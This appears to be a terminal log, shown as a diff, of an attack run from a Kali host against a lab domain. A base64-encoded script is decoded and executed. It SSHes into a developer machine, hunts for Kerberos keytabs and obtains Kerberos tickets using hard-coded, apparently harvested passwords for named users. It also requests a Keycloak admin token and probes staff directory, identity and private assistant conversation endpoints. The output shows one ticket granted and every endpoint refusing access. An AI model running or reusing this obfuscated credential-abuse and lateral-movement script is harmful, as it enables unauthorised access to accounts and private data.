@@ -1,0 +1,97 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/p14.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKQj1odHRwczovL3N0YWZmLmtlcGxlcm9wcy50ZXN0CmV4cG9ydCBLUkI1Q0NOQU1FPS90bXAva3JiNWNjX2syMQpleHBvcnQgS1JCNV9DT05GSUc9L2V0Yy9rcmI1LmNvbmYKZWNobyAiIyMjIyMjIyMga2V5dGFicyIKc3VkbyAtbiBrbGlzdCAtayAvZXRjL2tyYjUua2V5dGFiIDI+JjEgfCBoZWFkIC0yMApmaW5kIC9ob21lL3Jvd2FuIC1uYW1lICcqLmtleXRhYicgMj4vZGV2L251bGwgfCBoZWFkCmNhdCAvZXRjL2tyYjUuY29uZiAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwCmVjaG8gIiMjIyMjIyMjIGtpbml0IGF0dGVtcHRzIgpmb3Igc3BlYyBpbiAicm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byIgInJvd2FuLml0bzpmaWVsZGxpbmstZGV2LTI4NDEiICJtYXlhLnJhbnNjb21iZTpzV1FhMzEwODVGVFFla1poSFR4VXlmXzlFMW1hcnEwdXI4V05DS21UdG5rIjsgZG8KICB1PSR7c3BlYyUlOip9OyBwPSR7c3BlYyMqOn0KICBlY2hvICItLS0ga2luaXQgJHUiCiAgZWNobyAiJHAiIHwga2luaXQgIiR1IiAyPiYxIHwgaGVhZCAtNQogIGtsaXN0IDI+JjEgfCBoZWFkIC02CiAga2Rlc3Ryb3kgMj4vZGV2L251bGwKZG9uZQplY2hvICIjIyMjIyMjIyBpZiBraW5pdCByb3dhbiB3b3JrcywgbmVnb3RpYXRlIgplY2hvICdma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8nIHwga2luaXQgcm93YW4uaXRvIDI+JjEgfCBoZWFkIC0zCmtsaXN0IDI+JjEgfCBoZWFkIC02CmVjaG8gIi0tLSBzdGFmZiBuZWdvdGlhdGUgc2VydmljZS1kaXJlY3RvcnkiCmN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLS1uZWdvdGlhdGUgLXUgOiAtaSAiJEIvYXBpL3NlcnZpY2UtZGlyZWN0b3J5IiB8IGhlYWQgLTMwCmVjaG8gIi0tLSBzdGFmZiBuZWdvdGlhdGUgbWFuYWdlZCBzZXNzaW9uIHN1cHBvcnQiCmN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLS1uZWdvdGlhdGUgLXUgOiAtaSAtWCBQT1NUIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgIiRCL2FwaS9tYW5hZ2VkLWlkZW50aXRpZXMvc3VwcG9ydC9zZXNzaW9uIiB8IGhlYWQgLTMwCmVjaG8gIi0tLSBhc3Npc3RhbnQgbmVnb3RpYXRlIGNvbnZlcnNhdGlvbnMiCmN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLS1uZWdvdGlhdGUgLXUgOiAtaSAiJEEvYXBpL2NvbnZlcnNhdGlvbnMvQ09OVi1TVVAtMjg0MS0xOSIgfCBoZWFkIC0zMAplY2hvICIjIyMjIyMjIyBLZXljbG9hayB0b2tlbiB0aGVuIHRyeSBlbmRwb2ludHMiCkk9aHR0cHM6Ly9pZGVudGl0eS5rZXBsZXJvcHMudGVzdC9yZWFsbXMva2VwbGVyb3BzL3Byb3RvY29sL29wZW5pZC1jb25uZWN0L3Rva2VuCktUPSQoY3VybCAtc1NrIC1tIDEwIC0tY2FjZXJ0ICRDQSAtWCBQT1NUIC1kICdjbGllbnRfaWQ9YWRtaW4tY2xpJyAtZCAnZ3JhbnRfdHlwZT1wYXNzd29yZCcgLWQgJ3VzZXJuYW1lPXJvd2FuLml0bycgLS1kYXRhLXVybGVuY29kZSAncGFzc3dvcmQ9ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvJyAiJEkiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IGpzb24sc3lzO2Q9anNvbi5sb2FkKHN5cy5zdGRpbik7cHJpbnQoZC5nZXQoImFjY2Vzc190b2tlbiIsIiIpKScpCmVjaG8gIktUIGxlbiAkeyNLVH0iClsgLW4gIiRLVCIgXSAmJiBjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEtUIiAiaHR0cHM6Ly9pZGVudGl0eS5rZXBsZXJvcHMudGVzdC9yZWFsbXMva2VwbGVyb3BzL3Byb3RvY29sL29wZW5pZC1jb25uZWN0L3VzZXJpbmZvIiB8IGhlYWQgLWMgNTAwCmVjaG8KZWNobyAiLS0tIGFzc2lzdGFudCB3aXRoIGtleWNsb2FrIHRva2VuIgpjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEtUIiAtdyAnXG5bJXtodHRwX2NvZGV9XVxuJyAiJEEvYXBpL2NvbnZlcnNhdGlvbnMvQ09OVi1TVVAtMjg0MS0xOSIgfCBoZWFkIC1jIDgwMAplY2hvICItLS0gYXNzaXN0YW50IGFuc3dlcnMgd2l0aCBrZXljbG9hayB0b2tlbiIKY3VybCAtc1NrIC1tIDE1IC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRLVCIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3sicmVxdWVzdCI6InByaXZhdGVfZXNjYWxhdGlvbiIsImNvbnRleHRfaWQiOiJjdHgtc3VwcG9ydC1wcml2YXRlLXY0IiwiY29udmVyc2F0aW9uX2lkIjoiQ09OVi1TVVAtMjg0MS0xOSJ9JyAtdyAnXG5bJXtodHRwX2NvZGV9XVxuJyAiJEEvYXBpL2Fuc3dlcnMiIHwgaGVhZCAtYyA4MDAKZWNobyAiLS0tIHN0YWZmIGRpcmVjdG9yeSB3aXRoIGtleWNsb2FrIHRva2VuIgpjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEtUIiAtdyAnXG5bJXtodHRwX2NvZGV9XVxuJyAiJEIvYXBpL3NlcnZpY2UtZGlyZWN0b3J5IiB8IGhlYWQgLWMgNTAwCmtkZXN0cm95IDI+L2Rldi9udWxsCklOTkVSCmVjaG8gRE9ORV9NQVJLXyRSQU5ET00K
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/p14.sh; bash /tmp/p14.sh; echo DONEMARK_1795202258631$((6*7))
+######## keytabs
+bash: line 8: sudo: command not found
+[libdefaults]
+ default_realm = KEPLEROPS.TEST
+ dns_lookup_kdc = false
+ dns_lookup_realm = false
+ rdns = false
+ forwardable = true
+ udp_preference_limit = 1
+ ticket_lifetime = 10h
+
+[realms]
+ KEPLEROPS.TEST = {
+  kdc = kerberos.keplerops.test:88
+ }
+
+[domain_realm]
+ .keplerops.test = KEPLEROPS.TEST
+ keplerops.test = KEPLEROPS.TEST
+######## kinit attempts
+--- kinit rowan.ito
+Password for rowan.ito@KEPLEROPS.TEST: 
+Ticket cache: FILE:/tmp/krb5cc_k21
+Default principal: rowan.ito@KEPLEROPS.TEST
+
+Valid starting     Expires            Service principal
+11/20/26 19:17:50  11/21/26 05:17:50  krbtgt/KEPLEROPS.TEST@KEPLEROPS.TEST
+--- kinit rowan.ito
+Password for rowan.ito@KEPLEROPS.TEST: 
+kinit: Password incorrect while getting initial credentials
+klist: No credentials cache found (filename: /tmp/krb5cc_k21)
+--- kinit maya.ranscombe
+kinit: Client 'maya.ranscombe@KEPLEROPS.TEST' not found in Kerberos database while getting initial credentials
+klist: No credentials cache found (filename: /tmp/krb5cc_k21)
+######## if kinit rowan works, negotiate
+Password for rowan.ito@KEPLEROPS.TEST: 
+Ticket cache: FILE:/tmp/krb5cc_k21
+Default principal: rowan.ito@KEPLEROPS.TEST
+
+Valid starting     Expires            Service principal
+11/20/26 19:17:50  11/21/26 05:17:50  krbtgt/KEPLEROPS.TEST@KEPLEROPS.TEST
+--- staff negotiate service-directory
+HTTP/1.1 401 Unauthorized
+Server: nginx
+Date: Fri, 20 Nov 2026 19:17:50 GMT
+Content-Type: application/json
+Content-Length: 25
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: 3bbd3dc2-a959-4070-868d-2e5711463ba2
+
+{"error":"unauthorized"}
+--- staff negotiate managed session support
+HTTP/1.1 403 Forbidden
+Server: nginx
+Date: Fri, 20 Nov 2026 19:17:51 GMT
+Content-Type: application/json
+Content-Length: 36
+Connection: keep-alive
+
+{"error":"managed_identity_denied"}
+--- assistant negotiate conversations
+HTTP/1.1 403 Forbidden
+Server: nginx
+Date: Fri, 20 Nov 2026 19:17:51 GMT
+Content-Type: application/json
+Content-Length: 29
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: a028d7e9-5c36-4425-be8a-cdb7057081a9
+
+{"error":"session_required"}
+######## Keycloak token then try endpoints
+KT len 783
+
+--- assistant with keycloak token
+{"error":"session_required"}
+
+[403]
+--- assistant answers with keycloak token
+{"error":"session_required"}
+
+[403]
+--- staff directory with keycloak token
+{"error":"unauthorized"}
+
+[401]
+DONE_MARK_30758
